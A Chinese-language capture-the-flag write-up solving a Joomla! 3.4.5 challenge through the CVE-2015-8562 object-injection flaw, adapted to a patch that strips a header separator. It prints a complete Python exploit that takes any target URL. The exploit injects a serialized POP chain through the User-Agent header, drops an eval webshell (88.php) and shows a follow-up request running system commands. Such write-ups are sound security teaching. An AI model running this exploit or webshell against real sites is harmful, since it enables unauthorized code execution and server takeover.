# joomlaJoomla!

## 题目简述

目标标明为 Joomla! 3.4.5，对应未认证 PHP 对象注入漏洞 CVE-2015-8562。攻击者可把恶意序列化对象放进 `User-Agent` 或 `X-Forwarded-For`，Joomla 将请求信息写入 session 后再反序列化，POP 链最终把 `SimplePie::feed_url` 交给 `assert` 执行。题目额外修改了 session 代码：两个请求头中的第一个 `|` 都会被删除，因此公开 PoC 必须在序列化分隔处补一个额外的 `|`。

## 解题过程

先把题目源码与原版 Joomla! 3.4.5 比较。差异位于 `libraries/joomla/session/session.php`，核心逻辑等价于：

```php
$pos = strpos($_SERVER['HTTP_X_FORWARDED_FOR'], '|');
if ($pos) {
    $_SERVER['HTTP_X_FORWARDED_FOR'] = substr_replace(
        $_SERVER['HTTP_X_FORWARDED_FOR'], '', $pos, strlen('|')
    );
}

$pos = strpos($_SERVER['HTTP_USER_AGENT'], '|');
if ($pos) {
    $_SERVER['HTTP_USER_AGENT'] = substr_replace(
        $_SERVER['HTTP_USER_AGENT'], '', $pos, strlen('|')
    );
}
```

CVE-2015-8562 的请求头载荷通常以 `}__test|O:21:...` 连接伪造 session 前缀和序列化对象。题目会删掉这个分隔符，使 `unserialize` 看不到正确对象边界。把它改为 `}__test||O:21:...` 后，过滤只消耗第一个 `|`，剩余内容重新变成标准利用串。

下面保留官方脚本的完整关键路径，并把目标地址作为命令行参数。`php_str_noquotes` 用 `chr(...)` 拼出 PHP 字符串，避免序列化载荷中引号冲突；连续请求会建立 session、写入恶意请求头，再触发反序列化。

```python
import sys

import requests


def get_url(url, user_agent):
    headers = {"User-Agent": user_agent}
    cookies = requests.get(url, headers=headers, timeout=10).cookies
    response = None
    for _ in range(3):
        response = requests.get(
            url,
            headers=headers,
            cookies=cookies,
            timeout=10,
        )
    return response.content


def php_str_noquotes(data):
    return ".".join(f"chr({ord(character)})" for character in data)


def generate_payload(php_code):
    php_payload = f"eval({php_str_noquotes(php_code)})"
    injected = f"{php_payload};JFactory::getConfig();exit"
    terminate = "\xf0\xfd\xfd\xfd"

    # 题目会删掉请求头中的第一个竖线，因此这里故意使用 ||。
    payload = (
        '}__test||O:21:"JDatabaseDriverMysqli":3:{'
        's:2:"fc";O:17:"JSimplepieFactory":0:{}'
        's:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{'
        'i:0;O:9:"SimplePie":5:{'
        's:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}'
        's:8:"feed_url";'
    )
    payload += f's:{len(injected)}:"{injected}";'
    payload += (
        's:19:"cache_name_function";s:6:"assert";'
        's:5:"cache";b:1;'
        's:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}'
        '}i:1;s:4:"init";}}'
        's:13:"\\0\\0\\0connection";b:1;}'
    )
    return payload + terminate


def check(url):
    return requests.get(url, timeout=10).content


target = sys.argv[1].rstrip("/") + "/"
webshell = (
    "file_put_contents("
    "dirname($_SERVER['SCRIPT_FILENAME']).'/88.php',"
    "base64_decode('dnZ2PD9waHAgZXZhbCgkX1BPU1Rbenp6XSk7Pz4=')"
    ");"
)

payload = generate_payload(webshell)
get_url(target, payload)
shell_url = target + "88.php"

if b"vvv" in check(shell_url):
    print(f"webshell: {shell_url}, POST 参数: zzz")
else:
    print("利用失败：请核对 Joomla/PHP 版本和题目补丁")
```

脚本写出的 `88.php` 以前缀 `vvv` 作为存活标记，并执行 POST 参数 `zzz` 中的 PHP 代码。随后可请求：

```http
POST /88.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

zzz=system('cat /flag');
```

可用的公开 PoC 与完整 POP 链可在 [VoidSec/Joomla_CVE-2015-8562](https://github.com/VoidSec/Joomla_CVE-2015-8562) 查阅；本题不能直接照搬，决定性差异就是删除首个 `|` 的补丁。官方 PDF 引用的旧 `az0ne/joomla_exp` 地址现已无法稳定检索，因此不保留失效链接。PDF 未保存动态 flag。

## 方法总结

已知版本号能帮助定位 CVE，但复现失败时不能据此断言漏洞不存在。本题要求先做源码差异分析：原 POP 链和触发流程没有改变，只有序列化边界被破坏；多放一个分隔符即可在过滤后恢复载荷。处理历史漏洞题时，应同时核对应用版本、PHP 版本、会话触发次数和题目自定义补丁，而不是把公开 PoC 当作黑盒。
